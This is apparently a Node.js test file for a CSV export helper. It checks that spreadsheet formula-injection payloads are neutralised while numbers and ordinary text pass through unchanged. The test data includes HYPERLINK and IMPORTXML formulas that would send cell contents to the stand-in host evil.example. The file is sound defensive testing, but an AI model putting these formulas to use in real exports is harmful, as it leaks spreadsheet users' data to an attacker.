import assert from 'node:assert/strict';
import test from 'node:test';

import { buildCsv, escapeCell } from '../src/lib/csv.js';

test('formula triggers in untrusted text are neutralised', () => {
  for (const payload of [
    '=HYPERLINK("https://evil.example/?x="&A1,"claim your free month")',
    '+1+1',
    '-1+1',
    '@SUM(A1:A9)',
    '\tcmd',
    '\rcmd',
  ]) {
    const cell = escapeCell(payload);
    const unquoted = cell.startsWith('"') ? cell.slice(1, -1).replace(/""/g, '"') : cell;
    assert.equal(unquoted[0], "'", `expected leading apostrophe for ${JSON.stringify(payload)}`);
  }
});

test('plain numbers stay numeric so money columns remain usable', () => {
  assert.equal(escapeCell('-50.00'), '-50.00');
  assert.equal(escapeCell('-50'), '-50');
  assert.equal(escapeCell('120.5'), '120.5');
});

test('ordinary text is untouched', () => {
  assert.equal(escapeCell('Jane Smith'), 'Jane Smith');
  assert.equal(escapeCell('confirmed'), 'confirmed');
  assert.equal(escapeCell(null), '');
  assert.equal(escapeCell(undefined), '');
});

test('separators, quotes and newlines are still escaped', () => {
  assert.equal(escapeCell('a,b'), '"a,b"');
  assert.equal(escapeCell('say "hi"'), '"say ""hi"""');
  assert.equal(escapeCell('line1\nline2'), '"line1\nline2"');
  assert.equal(escapeCell('line1\rline2'), '"line1\rline2"');
});

test('a malicious lead cannot inject a formula through a full export', () => {
  const csv = buildCsv(
    [{ name: '=IMPORTXML(CONCAT("https://evil.example/?d=",A2),"//a")', email: 'a@b.co' }],
    [{ key: 'name', label: 'Name' }, { key: 'email', label: 'Email' }],
  );
  const dataRow = csv.split('\n')[1];
  assert.ok(!dataRow.startsWith('='), 'export row must not begin with a live formula');
  assert.ok(dataRow.includes("'=IMPORTXML"), 'payload should be defused, not dropped');
});

test('array values join before neutralising', () => {
  // The join separator is '; ', which needs no CSV quoting.
  assert.equal(escapeCell(['a', 'b']), 'a; b');
  assert.equal(escapeCell(['=cmd', 'b']), "'=cmd; b");
});
